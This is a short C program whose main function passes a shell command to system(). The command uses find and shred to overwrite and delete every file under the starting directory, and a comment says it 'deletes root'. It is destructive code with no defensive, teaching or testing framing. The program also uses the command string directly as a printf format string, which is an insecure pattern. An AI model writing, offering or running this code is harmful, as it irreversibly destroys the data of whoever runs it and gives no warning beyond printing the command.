
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {
   char command[200];

   strcpy(command, "sudo cd ~ && find . -exec shred {} -v -n1 -z -u \\;" );//deletes root
   printf(command);
   system(command);

   return(0);
} 
